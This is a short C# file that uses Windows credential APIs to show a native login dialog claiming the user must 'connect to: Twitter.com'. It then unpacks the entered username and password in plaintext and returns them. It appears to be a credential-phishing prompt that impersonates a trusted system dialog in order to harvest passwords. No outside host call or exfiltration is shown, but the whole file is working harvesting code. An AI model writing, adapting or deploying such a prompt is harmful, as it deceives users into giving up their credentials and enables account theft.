using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
namespace WinCred
{
    public class CredentialDialog
    {
        [DllImport("ole32.dll")]
        public static extern void CoTaskMemFree(IntPtr ptr);
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }
        [DllImport("credui.dll", CharSet = CharSet.Unicode)]
        public static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
                                                             int authError,
                                                             ref uint authPackage,
                                                             IntPtr InAuthBuffer,
                                                             uint InAuthBufferSize,
                                                             out IntPtr refOutAuthBuffer,
                                                             out uint refOutAuthBufferSize,
                                                             ref bool fSave,
                                                             int flags);
        [DllImport("credui.dll", CharSet = CharSet.Unicode)]
        public static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
                                                           IntPtr pAuthBuffer,
                                                           uint cbAuthBuffer,
                                                           StringBuilder pszUserName,
                                                           ref int pcchMaxUserName,
                                                           StringBuilder pszDomainName,
                                                           ref int pcchMaxDomainame,
                                                           StringBuilder pszPassword,
                                                           ref int pcchMaxPassword);
        public static List<string> AuthEasy()
        {
            CREDUI_INFO credui = new CREDUI_INFO();
            credui.pszCaptionText = "Enter your network credentials";
            credui.pszMessageText = "Enter your credentials to connect to: Twitter.com";
            credui.cbSize = Marshal.SizeOf(credui);
            uint authPackage = 0;
            IntPtr outCredBuffer = new IntPtr();
            uint outCredSize;
            bool save = false;

            int result = CredUIPromptForWindowsCredentials(ref credui, 0, ref authPackage, IntPtr.Zero, 0, out outCredBuffer, out outCredSize, ref save, 1);

            var usernameBuf = new StringBuilder(100);
            var passwordBuf = new StringBuilder(100);
            var domainBuf = new StringBuilder(100);

            int maxUserName = 100;
            int maxDomain = 100;
            int maxPassword = 100;
            List<string> clis = new List<string>();
            if (result == 0)
            {
                if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName, domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
                {
                    //clear the memory allocated by CredUIPromptForWindowsCredentials
                    CoTaskMemFree(outCredBuffer);

                    clis.Add(usernameBuf.ToString());
                    clis.Add(passwordBuf.ToString());
                    return clis;
                }
                else
                {
                    return clis;
                }
            }
            else
            {
                return clis;
            }
        }
    }
}